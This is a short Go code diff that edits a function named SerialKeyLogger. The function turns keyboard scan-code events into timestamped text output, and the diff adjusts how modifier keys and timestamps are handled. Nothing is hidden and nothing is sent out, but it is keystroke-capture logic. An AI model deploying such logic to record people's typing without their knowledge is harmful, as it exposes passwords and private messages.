@@ -57,6 +57,8 @@ func SerialKeyLogger(keyboardChan chan types.KeyboardEvent, keyboard layout.Keyb
 			lshift = state
 		case "rshift":
 			rshift = state
+		default:
+			return
 		}
 
 		control = bool(lcontrol) || bool(rcontrol)
@@ -102,6 +104,7 @@ func SerialKeyLogger(keyboardChan chan types.KeyboardEvent, keyboard layout.Keyb
 				stdout <- fmt.Sprintf("\n%s|", lastTime.Format(time.RFC3339)[:16])
 			}
 			stdout <- piece
+			lastTime = now
 		}
 	}()
 
@@ -150,7 +153,6 @@ func SerialKeyLogger(keyboardChan chan types.KeyboardEvent, keyboard layout.Keyb
 		} else {
 			sign = keyboard.Lower[key.ScanCode]
 		}
-		_ = sign
 
 		if sign.Kind == layout.Alpha || sign.Kind == layout.Numeric {
 			content <- sign.Name
@@ -170,7 +172,5 @@ func SerialKeyLogger(keyboardChan chan types.KeyboardEvent, keyboard layout.Keyb
 		} else if len(sign.Name) > 0 {
 			content <- fmt.Sprintf(".%s/", sign.Name)
 		}
-
-		lastTime = now
 	}
 }
